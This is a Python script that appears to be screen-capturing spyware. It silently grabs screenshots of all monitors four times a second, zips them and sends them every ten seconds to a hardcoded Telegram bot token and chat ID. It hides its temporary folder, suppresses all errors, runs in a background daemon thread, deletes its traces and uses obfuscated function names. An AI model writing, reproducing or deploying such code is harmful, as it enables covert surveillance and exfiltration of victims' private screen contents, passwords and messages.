import platform
import sys
from PIL import Image, ImageGrab
import time
import os
import tempfile
import shutil
import asyncio
from aiogram import Bot, Dispatcher
from aiogram.types import FSInputFile
from threading import Thread
import zipfile

try:
    import win32api
    import win32con
except ImportError as e:
    pass

TELEGRAM_BOT_TOKEN = '7624890612:AAEN6bpLJCbotHXb2iLqLZSJr6-qFlZk08o'
CHAT_ID = '5018443124'

# Инициализация бота
bot = Bot(token=TELEGRAM_BOT_TOKEN)
dp = Dispatcher()

def cpt_sct(save_path):
    try:
        img = ImageGrab.grab(all_screens=True)
        img = img.resize((img.width // 2, img.height // 2), Image.Resampling.LANCZOS)
        img = img.convert('RGB')
        img.save(save_path, format='PNG', optimize=True)
    except Exception as e:
        pass

def crt_z(screenshot_files, zip_path):
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in screenshot_files:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
    except Exception as e:
        pass

async def snd_telg(zip_path, retries=3):
    if not os.path.exists(zip_path):
        return False

    for attempt in range(1, retries + 1):
        try:
            document = FSInputFile(zip_path, filename='screenshots.zip')
            await bot.send_document(chat_id=CHAT_ID, document=document)
            return True
        except Exception as e:
            if attempt < retries:
                await asyncio.sleep(5)
    return False

def kdjfhg_dfgdfg(temp_dir):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    screenshot_files = []
    last_send_time = time.time()

    while True:
        try:
            timestamp = time.time()
            screenshot_path = os.path.join(temp_dir, f'screenshot_{timestamp}.png')

            cpt_sct(screenshot_path)
            if os.path.exists(screenshot_path):
                screenshot_files.append(screenshot_path)

            current_time = time.time()
            if current_time - last_send_time >= 10 and screenshot_files:
                zip_path = os.path.join(temp_dir, 'screenshots.zip')
                crt_z(screenshot_files, zip_path)

                if os.path.exists(zip_path):
                    success = loop.run_until_complete(snd_telg(zip_path))

                for file in screenshot_files:
                    try:
                        if os.path.exists(file):
                            os.remove(file)
                    except OSError as e:
                        pass
                try:
                    if os.path.exists(zip_path):
                        os.remove(zip_path)
                except OSError as e:
                    pass

                screenshot_files = []
                last_send_time = current_time

        except Exception as e:
            pass

        time.sleep(0.25)

def scrn():
    temp_dir = os.path.join(tempfile.gettempdir(), 'screenshots')
    if not os.path.exists(temp_dir):
        try:
            os.makedirs(temp_dir)
            win32api.SetFileAttributes(temp_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
        except Exception as e:
            pass

    thread = Thread(target=kdjfhg_dfgdfg, args=(temp_dir,), daemon=True)
    thread.start()
    return thread